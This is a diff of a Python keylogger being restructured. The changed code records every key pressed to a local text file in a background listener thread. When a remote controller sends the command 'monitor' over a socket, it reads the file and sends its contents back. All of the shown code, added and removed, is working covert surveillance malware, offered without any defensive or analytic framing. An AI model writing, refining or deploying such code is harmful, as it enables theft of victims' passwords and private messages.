@@ -8,12 +8,19 @@ file_location = os.getcwd()
 file_is_open = False
 text_file_name = file_location + "\\textfile.txt"
 
-def send_file():
-    data = (s.recv(1024)).decode("utf-8")
-    if data == "monitor":
-        with open("textfile.txt", "r") as read_file:
-            file_data = read_file.read()
-            s.sendall(file_data.encode("utf-8"))
+def on_press(key):
+    global file_is_open
+    try:
+        k = key.char
+    except:
+        k = ""
+    print('Key pressed: ' + k)
+    with open("textfile.txt", "a+") as file:
+        file.write(k)
+def listen_keyboard():
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    listener.join()
 
 while True:
     while True:
@@ -24,17 +31,12 @@ while True:
         except:
             print("Trying to connect...")
     while True:
-        threading.Thread(target=send_file).start()
-        def on_press(key):
-            global file_is_open
-            try:
-                k = key.char
-            except:
-                k = ""
-            print('Key pressed: ' + k)
-            with open("textfile.txt", "a+") as file:
-                file.write(k)
-
-        listener = keyboard.Listener(on_press=on_press)
-        listener.start()
-        listener.join()
+        threading.Thread(target=listen_keyboard).start()
+        try:
+            data = (s.recv(1024)).decode("utf-8")
+            if data == "monitor":
+                with open("textfile.txt", "r") as read_file:
+                    file_data = read_file.read()
+                    s.sendall(file_data.encode("utf-8"))
+        except:
+            break
